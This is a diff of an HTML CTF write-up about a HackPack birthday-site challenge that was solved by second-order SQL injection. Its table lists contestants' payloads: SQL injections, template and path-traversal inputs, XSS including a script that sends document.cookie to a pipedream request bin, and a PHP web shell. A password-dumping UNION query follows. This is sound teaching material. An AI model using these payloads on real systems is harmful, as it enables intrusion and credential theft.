@@ -68,7 +68,7 @@ birthday party. That is why we decided to create a website where you
 can find those who have the same birthdate as yours. Check it out:
 <a href="https://online-birthday-party.cha.hackpack.club/">https://online-birthday-party.cha.hackpack.club/</a></p>
 </blockquote>
-<p>I noticed straight away that the username wasn't sanitised, so I figured
+<p>I noticed straight away that the username wasn&rsquo;t sanitised, so I figured
 this was an XSS challenge. I set up a request bin in preparation for
 snooping some cookies, and then tried to register with the neat
 cross-origin image exfiltration technique</p>
@@ -81,7 +81,7 @@ or less given up on the approach, I finally got a hit. I copied the
 cookie and reloaded the page:</p>
 <blockquote>
 <p>Hello, blacknote10!</p>
-<p>Your birthday: 0&rsquo; OR 1=1 #&ndash;</p>
+<p>Your birthday: 0' OR 1=1 #&ndash;</p>
 </blockquote>
 <p>Hello blacknote, indeed. This was not the automatic script I had
 expected, but another contestant. It now dawned on me that this
@@ -96,188 +96,188 @@ are some examples in no particular order:</p>
 <table>
 <thead>
 <tr>
-<th align="left">Username</th>
-<th align="left">Birthday</th>
-<th align="center">Comment</th>
+<th style="text-align:left">Username</th>
+<th style="text-align:left">Birthday</th>
+<th style="text-align:center">Comment</th>
 </tr>
 </thead>
 <tbody>
 <tr>
-<td align="left"><code>admin</code></td>
-<td align="left"><code>1/1/2001</code></td>
-<td align="center">The admin account. Note the different date format.</td>
+<td style="text-align:left"><code>admin</code></td>
+<td style="text-align:left"><code>1/1/2001</code></td>
+<td style="text-align:center">The admin account. Note the different date format.</td>
 </tr>
 <tr>
-<td align="left"><code>x-1587597992</code></td>
-<td align="left"><code>2020-04-1</code></td>
-<td align="center"></td>
+<td style="text-align:left"><code>x-1587597992</code></td>
+<td style="text-align:left"><code>2020-04-1</code></td>
+<td style="text-align:center"></td>
 </tr>
 <tr>
-<td align="left"><code>herve</code></td>
-<td align="left"><code>2020-04-24</code></td>
-<td align="center">Some normal looking stuff.</td>
+<td style="text-align:left"><code>herve</code></td>
+<td style="text-align:left"><code>2020-04-24</code></td>
+<td style="text-align:center">Some normal looking stuff.</td>
 </tr>
 <tr>
-<td align="left"><code>abc</code></td>
-<td align="left"><code>214748-03-31</code></td>
-<td align="center">A strange year.</td>
+<td style="text-align:left"><code>abc</code></td>
+<td style="text-align:left"><code>214748-03-31</code></td>
+<td style="text-align:center">A strange year.</td>
 </tr>
 <tr>
-<td align="left"><code>test1</code></td>
-<td align="left"><code>'or'1'='1'--</code></td>
-<td align="center"></td>
+<td style="text-align:left"><code>test1</code></td>
+<td style="text-align:left"><code>'or'1'='1'--</code></td>
+<td style="text-align:center"></td>
 </tr>
 <tr>
-<td align="left"><code>asdf</code></td>
-<td align="left"><code>' UNION SELECT NULL</code></td>
-<td align="center"></td>
+<td style="text-align:left"><code>asdf</code></td>
+<td style="text-align:left"><code>' UNION SELECT NULL</code></td>
+<td style="text-align:center"></td>
 </tr>
 <tr>
-<td align="left"><code>'</code></td>
-<td align="left"><code>' ON DUPLICATE KEY UPDATE password=&quot;asdf&quot; --</code></td>
-<td align="center"></td>
+<td style="text-align:left"><code>'</code></td>
+<td style="text-align:left"><code>' ON DUPLICATE KEY UPDATE password=&quot;asdf&quot; --</code></td>
+<td style="text-align:center"></td>
 </tr>
 <tr>
-<td align="left"><code>www</code></td>
-<td align="left"><code>2002-01-01' UNION SELECT * FROM </code> <code>information_schema.columns WHERE table_name = '%</code></td>
-<td align="center"></td>
+<td style="text-align:left"><code>www</code></td>
+<td style="text-align:left"><code>2002-01-01' UNION SELECT * FROM </code> <code>information_schema.columns WHERE table_name = '%</code></td>
+<td style="text-align:center"></td>
 </tr>
 <tr>
-<td align="left"><code>k3</code></td>
-<td align="left"><code>2020-04-06 order by 10-- -</code></td>
-<td align="center">Heaps of SQL injections.</td>
+<td style="text-align:left"><code>k3</code></td>
+<td style="text-align:left"><code>2020-04-06 order by 10-- -</code></td>
+<td style="text-align:center">Heaps of SQL injections.</td>
 </tr>
 <tr>
-<td align="left"><code>{{config}}</code></td>
-<td align="left"><code>2000-01-01</code></td>
-<td align="center"></td>
+<td style="text-align:left"><code>{{config}}</code></td>
+<td style="text-align:left"><code>2000-01-01</code></td>
+<td style="text-align:center"></td>
 </tr>
 <tr>
-<td align="left"><code>{{ 7*7 }}</code></td>
-<td align="left"><code>1994-03-04</code></td>
-<td align="center">Template injections.</td>
+<td style="text-align:left"><code>{{ 7*7 }}</code></td>
+<td style="text-align:left"><code>1994-03-04</code></td>
+<td style="text-align:center">Template injections.</td>
 </tr>
 <tr>
-<td align="left"><code>whaaat</code></td>
-<td align="left"><code>1' OR password like 'flag{%</code></td>
-<td align="center">Interesting!</td>
+<td style="text-align:left"><code>whaaat</code></td>
+<td style="text-align:left"><code>1' OR password like 'flag{%</code></td>
+<td style="text-align:center">Interesting!</td>
 </tr>
 <tr>
-<td align="left"><code>c:/Windows/system.ini</code></td>
-<td align="left"><code>2020-04-23</code></td>
-<td align="center"></td>
+<td style="text-align:left"><code>c:/Windows/system.ini</code></td>
+<td style="text-align:left"><code>2020-04-23</code></td>
+<td style="text-align:center"></td>
 </tr>
 <tr>
-<td align="left"><code>..\..\..\..\..\..\..\..\..</code> <code>\..\..\..\..\..\..\..\Windows\system.ini</code></td>
-<td align="left"><code>2020-04-23</code></td>
-<td align="center"></td>
+<td style="text-align:left"><code>..\..\..\..\..\..\..\..\..</code> <code>\..\..\..\..\..\..\..\Windows\system.ini</code></td>
+<td style="text-align:left"><code>2020-04-23</code></td>
+<td style="text-align:center"></td>
 </tr>
 <tr>
-<td align="left"><code>/etc/passwd</code></td>
-<td align="left"><code>2020-04-23</code></td>
-<td align="center">Direct file traversals.</td>
+<td style="text-align:left"><code>/etc/passwd</code></td>
+<td style="text-align:left"><code>2020-04-23</code></td>
+<td style="text-align:center">Direct file traversals.</td>
 </tr>
 <tr>
-<td align="left"><code>p4</code></td>
-<td align="left"><code>' union SELECT load_file('/var/lib/mysql-files/flag.txt'),1;-- -</code></td>
-<td align="center"></td>
+<td style="text-align:left"><code>p4</code></td>
+<td style="text-align:left"><code>' union SELECT load_file('/var/lib/mysql-files/flag.txt'),1;-- -</code></td>
+<td style="text-align:center"></td>
 </tr>
 <tr>
-<td align="left"><code>p6</code></td>
-<td align="left"><code>' union SELECT load_file(0x272f7661722f6c69622f6d79</code> <code>73716c2d66696c65732f666c61672e74787427),1;--</code></td>
-<td align="center">File traversal through SQL.</td>
+<td style="text-align:left"><code>p6</code></td>
+<td style="text-align:left"><code>' union SELECT load_file(0x272f7661722f6c69622f6d79</code> <code>73716c2d66696c65732f666c61672e74787427),1;--</code></td>
+<td style="text-align:center">File traversal through SQL.</td>
 </tr>
 <tr>
-<td align="left"><code>flag</code></td>
-<td align="left"><code>2020-04-23</code></td>
-<td align="center">Don't think that's going to work.</td>
+<td style="text-align:left"><code>flag</code></td>
+<td style="text-align:left"><code>2020-04-23</code></td>
+<td style="text-align:center">Don&rsquo;t think that&rsquo;s going to work.</td>
 </tr>
 <tr>
-<td align="left"><code>thishouldnotexistandhopefullyitwillnot</code></td>
-<td align="left"><code>2020-04-23</code></td>
-<td align="center">Alas, it does.</td>
+<td style="text-align:left"><code>thishouldnotexistandhopefullyitwillnot</code></td>
+<td style="text-align:left"><code>2020-04-23</code></td>
+<td style="text-align:center">Alas, it does.</td>
 </tr>
 <tr>
-<td align="left"><code>http://www.google.com:80/search?q=OWASP%20ZAP</code></td>
-<td align="left"><code>2020-04-23</code></td>
-<td align="center">Not sure what's going on here.</td>
+<td style="text-align:left"><code>http://www.google.com:80/search?q=OWASP%20ZAP</code></td>
+<td style="text-align:left"><code>2020-04-23</code></td>
+<td style="text-align:center">Not sure what&rsquo;s going on here.</td>
 </tr>
 <tr>
-<td align="left"><code>&lt;!--#EXEC cmd=&quot;ls /&quot;--&gt;</code></td>
-<td align="left"><code>2020-04-23</code></td>
-<td align="center">Some other form of injection.</td>
+<td style="text-align:left"><code>&lt;!--#EXEC cmd=&quot;ls /&quot;--&gt;</code></td>
+<td style="text-align:left"><code>2020-04-23</code></td>
+<td style="text-align:center">Some other form of injection.</td>
 </tr>
 <tr>
-<td align="left"><code>&lt;b&gt;hi&lt;/b&gt;</code></td>
-<td align="left"><code>0000-01-01</code></td>
-<td align="center"></td>
+<td style="text-align:left"><code>&lt;b&gt;hi&lt;/b&gt;</code></td>
+<td style="text-align:left"><code>0000-01-01</code></td>
+<td style="text-align:center"></td>
 </tr>
 <tr>
-<td align="left"><code>ab</code></td>
-<td align="left"><code>&lt;u&gt;aa&lt;/u&gt;</code></td>
-<td align="center">HTML injections.</td>
+<td style="text-align:left"><code>ab</code></td>
+<td style="text-align:left"><code>&lt;u&gt;aa&lt;/u&gt;</code></td>
+<td style="text-align:center">HTML injections.</td>
 </tr>
 <tr>
-<td align="left"><code>ab1</code></td>
-<td align="left"><code>&lt;script&gt;alert(1)&lt;/script&gt;</code></td>
-<td align="center"></td>
+<td style="text-align:left"><code>ab1</code></td>
+<td style="text-align:left"><code>&lt;script&gt;alert(1)&lt;/script&gt;</code></td>
+<td style="text-align:center"></td>
 </tr>
 <tr>
-<td align="left"><code>&lt;script&gt;alert('yo');&lt;/script&gt;</code></td>
-<td align="left"><code>2020-04-27</code></td>
-<td align="center">Other peoples JavaScript injections.</td>
+<td style="text-align:left"><code>&lt;script&gt;alert('yo');&lt;/script&gt;</code></td>
+<td style="text-align:left"><code>2020-04-27</code></td>
+<td style="text-align:center">Other peoples JavaScript injections.</td>
 </tr>
 <tr>
-<td align="left"><code>admin</code></td>
-<td align="left"><code>2020-04-08</code></td>
-<td align="center">Another admin account.</td>
+<td style="text-align:left"><code>admin</code></td>
+<td style="text-align:left"><code>2020-04-08</code></td>
+<td style="text-align:center">Another admin account.</td>
 </tr>
 <tr>
-<td align="left"><code>herve2</code></td>
-<td align="left"><code>\\a\l\e\r\t\(\'\X\S\S\'\)\;\</code>                                                                    |                                                    |</td>
-<td></td>
+<td style="text-align:left"><code>herve2</code></td>
+<td style="text-align:left"><code>\\a\l\e\r\t\(\'\X\S\S\'\)\;\</code></td>
+<td style="text-align:center"></td>
 </tr>
 <tr>
-<td align="left"><code>herve3</code></td>
-<td align="left"><code>'\\U\N\I\O\N\A\L\L\S\E\L\E\C\T\*\F\R\O\M\u\s\e\r\s\'</code></td>
-<td align="center">Lots of leaning sticks.</td>
+<td style="text-align:left"><code>herve3</code></td>
+<td style="text-align:left"><code>'\\U\N\I\O\N\A\L\L\S\E\L\E\C\T\*\F\R\O\M\u\s\e\r\s\'</code></td>
+<td style="text-align:center">Lots of leaning sticks.</td>
 </tr>
 <tr>
-<td align="left"><code>jHcY') AND 8400=7228 AND ('QIlv'='QIlv</code></td>
-<td align="left"><code>hpXo</code></td>
-<td align="center"></td>
+<td style="text-align:left"><code>jHcY') AND 8400=7228 AND ('QIlv'='QIlv</code></td>
+<td style="text-align:left"><code>hpXo</code></td>
+<td style="text-align:center"></td>
 </tr>
 <tr>
-<td align="left"><code>jHcY&quot;) AS jHgo WHERE 5594=5594 AND 5122=7506-- YpXl</code></td>
-<td align="left"><code>hpXo</code></td>
-<td align="center">A bunch of stuff like this.</td>
+<td style="text-align:left"><code>jHcY&quot;) AS jHgo WHERE 5594=5594 AND 5122=7506-- YpXl</code></td>
+<td style="text-align:left"><code>hpXo</code></td>
+<td style="text-align:center">A bunch of stuff like this.</td>
 </tr>
 <tr>
-<td align="left"><code>&lt;script&gt;alert(10)&lt;/script&gt;</code></td>
-<td align="left"><code>1337-10-10</code></td>
-<td align="center">My first JavaScript injection.</td>
+<td style="text-align:left"><code>&lt;script&gt;alert(10)&lt;/script&gt;</code></td>
+<td style="text-align:left"><code>1337-10-10</code></td>
+<td style="text-align:center">My first JavaScript injection.</td>
 </tr>
 <tr>
-<td align="left"><code>&lt;script&gt;document.location='</code> <code>https://enii5hhtwuak.x.pipedream.net/?cookie='+document.cookie&lt;/script&gt;</code></td>
-<td align="left"><code>1337-11-10</code></td>
-<td align="center">My second JavaScript injeciton.</td>
+<td style="text-align:left"><code>&lt;script&gt;document.location='</code> <code>https://enii5hhtwuak.x.pipedream.net/?cookie='+document.cookie&lt;/script&gt;</code></td>
+<td style="text-align:left"><code>1337-11-10</code></td>
+<td style="text-align:center">My second JavaScript injeciton.</td>
 </tr>
 <tr>
-<td align="left"><code>&lt;?php     if(isset($_GET['cmd']))     {         system($_GET['cmd']);     } ?&gt;</code></td>
-<td align="left"><code>2020-03-19</code></td>
-<td align="center">PHP injection.</td>
+<td style="text-align:left"><code>&lt;?php     if(isset($_GET['cmd']))     {         system($_GET['cmd']);     } ?&gt;</code></td>
+<td style="text-align:left"><code>2020-03-19</code></td>
+<td style="text-align:center">PHP injection.</td>
 </tr>
 <tr>
-<td align="left"><code>ab2</code></td>
-<td align="left"><code>whoami</code></td>
-<td align="center">Shell injection.</td>
+<td style="text-align:left"><code>ab2</code></td>
+<td style="text-align:left"><code>whoami</code></td>
+<td style="text-align:center">Shell injection.</td>
 </tr>
 </tbody>
 </table>
 <p>Looking through these it was not too hard to figure out how to also dump the
 passwords – something like:</p>
 <pre><code>' UNION SELECT username, password FORM users WHERE '' = '
-</code></pre><p>So now, if I wanted to try something out, I didn't have to create an new
+</code></pre><p>So now, if I wanted to try something out, I didn&rsquo;t have to create an new
 account, but could simply log into the existing one instead. As an added
 bonus, the flag was found as the password for the admin account:</p>
 <pre><code>flag{c0mpl1cat3d_2nd_0rd3r_sql}
@@ -288,10 +288,10 @@ bonus, the flag was found as the password for the admin account:</p>
 
 <div class="authorbox clearfix">
 	<div class="authorbox__header">
-		<span class="authorbox__name">About Lars Haulin</span>
+		<span class="authorbox__name"></span>
 	</div>
 	<div class="authorbox__description">
-		Lars is an UU alumn, working as an IT-security specialist in Uppsala. He has been playing CTFs for over 10 year with the top ranked swedish team HackingForSoju.
+		Lars is an UU alumn, working as an IT-security specialist in Uppsala. He has been playing CTFs for over 10 years with the top ranked Swedish team HackingForSoju.
 	</div>
 </div>
 
